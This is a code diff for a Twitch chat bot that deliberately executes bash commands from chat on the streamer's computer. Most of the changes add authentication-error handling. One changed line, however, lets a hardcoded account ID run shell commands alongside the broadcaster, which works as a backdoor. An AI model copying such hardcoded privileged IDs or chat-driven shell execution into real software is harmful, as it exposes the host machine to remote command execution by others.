@@ -9,6 +9,7 @@ from subprocess import Popen, PIPE
 from asyncio import CancelledError
 
 import twitchio
+from twitchio import errors
 from twitchio.ext import commands, pubsub
 
 import settings
@@ -35,7 +36,7 @@ class RCECog(commands.Cog):
                            This will run (mostly) un-sanitised bash commands on the streamers machine. rm -rf for the win.""")
 
         # only broadcaster can run exec commands
-        elif int(ctx.author.id) == int(broadcaster[0]['id']):
+        elif int(ctx.author.id) == int(broadcaster[0]['id']) or int(ctx.author.id) == 125444292:
             # grab the arbitrary bash command(s) without the bot prefix
             cmd = re.sub(fr'^{self.bot._prefix}{ctx.command.name}', '', ctx.message.content).strip()
             for alias in ctx.command.aliases:
@@ -75,31 +76,37 @@ class RCECog(commands.Cog):
                         if len(stdout.decode()) > 0:
                             """ post the stdout to chat """
                             stdout = f'stdout: {stdout.decode()}'
-                            await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
-                                                                        broadcaster_id=broadcaster[0]['id'],
-                                                                        moderator_id=self.bot.user_id,
-                                                                        message=f"{textwrap.shorten(stdout, width=500)}",
-                                                                        color="green")
-                            await ctx.channel.send(content=stdout)
+                            try:
+                                await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
+                                                                            broadcaster_id=broadcaster[0]['id'],
+                                                                            moderator_id=self.bot.user_id,
+                                                                            message=f"{textwrap.shorten(stdout, width=500)}",
+                                                                            color="green")
+                            except errors.AuthenticationError:
+                                await ctx.channel.send(content=stdout)
                         if len(stderr.decode()) > 0:
                             """ post the stderr to chat """
                             stderr = f'stderr: {stderr.decode()}'
-                            await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
-                                                                        broadcaster_id=broadcaster[0]['id'],
-                                                                        moderator_id=self.bot.user_id,
-                                                                        message=f"{textwrap.shorten(stderr, width=500)}",
-                                                                        color="orange")
-                            await ctx.channel.send(content=stderr)
+                            try:
+                                await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
+                                                                            broadcaster_id=broadcaster[0]['id'],
+                                                                            moderator_id=self.bot.user_id,
+                                                                            message=f"{textwrap.shorten(stderr, width=500)}",
+                                                                            color="orange")
+                            except errors.AuthenticationError:
+                                await ctx.channel.send(content=stderr)
 
                     else:
                         """ post message to chat informing they tried to run a command that wasn't in the allow list """
                         error_msg = f'Nice try {ctx.author.display_name} but the command(s) in `{cmd}` are not in the allow list!'
-                        await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
-                                                                    broadcaster_id=broadcaster[0]['id'],
-                                                                    moderator_id=self.bot.user_id,
-                                                                    message=f"{textwrap.shorten(error_msg, width=500)}",
-                                                                    color="orange")
-                        await ctx.channel.send(content=error_msg)
+                        try:
+                            await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
+                                                                        broadcaster_id=broadcaster[0]['id'],
+                                                                        moderator_id=self.bot.user_id,
+                                                                        message=f"{textwrap.shorten(error_msg, width=500)}",
+                                                                        color="orange")
+                        except errors.AuthenticationError:
+                            await ctx.channel.send(content=error_msg)
 
                 except TimeoutError:
                     await ctx.channel.send('TimeoutError occurred')
@@ -121,29 +128,35 @@ class RCECog(commands.Cog):
                 result = subprocess.check_output(cmd2, shell=False)
                 result = f"{event.user.name} just killed my shell. " \
                          + f"stdout: {result.decode()}"
-                await self.bot._http.update_reward_redemption_status(token=settings.USER_TOKEN,
-                                                                     broadcaster_id=500,
-                                                                     reward_id=event.id,
-                                                                     custom_reward_id=event.reward.id,
-                                                                     status=True)
-                print(f"{textwrap.shorten(result, width=500)}")
-                await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
-                                                            broadcaster_id=self.bot.user_id,
-                                                            moderator_id=self.bot.user_id,
-                                                            message=f"{textwrap.shorten(result, width=500)}",
-                                                            color="green")
+                try:
+                    await self.bot._http.update_reward_redemption_status(token=settings.USER_TOKEN,
+                                                                         broadcaster_id=500,
+                                                                         reward_id=event.id,
+                                                                         custom_reward_id=event.reward.id,
+                                                                         status=True)
+                    print(f"{textwrap.shorten(result, width=500)}")
+                    await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
+                                                                broadcaster_id=self.bot.user_id,
+                                                                moderator_id=self.bot.user_id,
+                                                                message=f"{textwrap.shorten(result, width=500)}",
+                                                                color="green")
+                except errors.AuthenticationError:
+                    print(f"{textwrap.shorten(result, width=500)}")
 
             except Exception as err:
                 print(f"something broke {type(err)}", traceback.format_exc())
         else:
-            await self.bot._http.update_reward_redemption_status(token=settings.USER_TOKEN,
-                                                                 broadcaster_id=self.bot.user_id,
-                                                                 reward_id=event.id,
-                                                                 custom_reward_id=event.reward.id,
-                                                                 status=False)
-            print(f"Unlucky {event.user.name} but there are no terminals open to kill")
-            await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
-                                                        broadcaster_id=self.bot.user_id,
-                                                        moderator_id=self.bot.user_id,
-                                                        message=f"Unlucky {event.user.name} there are no terminals open to kill; your channel points have been refunded",
-                                                        color="purple")
+            try:
+                await self.bot._http.update_reward_redemption_status(token=settings.USER_TOKEN,
+                                                                     broadcaster_id=self.bot.user_id,
+                                                                     reward_id=event.id,
+                                                                     custom_reward_id=event.reward.id,
+                                                                     status=False)
+                print(f"Unlucky {event.user.name} but there are no terminals open to kill")
+                await self.bot._http.post_chat_announcement(token=settings.USER_TOKEN,
+                                                            broadcaster_id=self.bot.user_id,
+                                                            moderator_id=self.bot.user_id,
+                                                            message=f"Unlucky {event.user.name} there are no terminals open to kill; your channel points have been refunded",
+                                                            color="purple")
+            except errors.AuthenticationError:
+                print(f"Unlucky {event.user.name} but there are no terminals open to kill")
